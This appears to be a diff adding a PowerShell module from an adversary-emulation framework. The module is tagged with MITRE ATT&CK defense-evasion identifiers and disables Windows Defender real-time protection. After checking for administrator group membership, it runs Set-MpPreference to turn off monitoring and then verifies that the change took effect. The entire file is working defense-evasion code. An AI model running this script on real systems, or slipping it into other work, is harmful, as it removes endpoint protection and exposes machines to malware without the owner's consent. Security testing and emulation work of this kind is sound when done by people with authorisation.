@@ -1,0 +1,49 @@
+#Title: invoke-disableDefender
+#Technique: T1211
+#Tactic: TA0005
+
+function invoke-disableDefender{
+    
+    #default values
+    $good = $false
+    $results = ""
+
+    #disable defender realtime protection
+    $results = disable-realtime
+    if($results.Contains("successfully")){
+        $good = $true
+    }
+
+    #Return results
+    return @{results = $results; success = $good }
+}
+
+function disable-realtime {
+    
+    $isAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+    #if the windows identity matches the admin group sid
+    if ($isAdmin){
+            #disable realtime monitoring
+            Set-MpPreference -DisableRealtimeMonitoring $true
+            defenderStatus
+    }else { return "Admin privileges required"}
+}
+
+function defenderStatus {
+    
+    #Checks the realtime protection status
+    $outp = Get-MpPreference | Format-List DisableRealtimeMonitoring | out-string
+    if ($outp.Contains("True")) {
+        return "Defender RealTime Protection has been disabled successfully"
+    } else { return "Defender RealTime Protection couldn´t been disabled" }
+}
+
+#Main
+
+#GiveMeData if needed
+
+#pdd
+$execute = invoke-disableDefender
+return @{results = $execute.results; success = $execute.success; }
+
+#PutData if needed
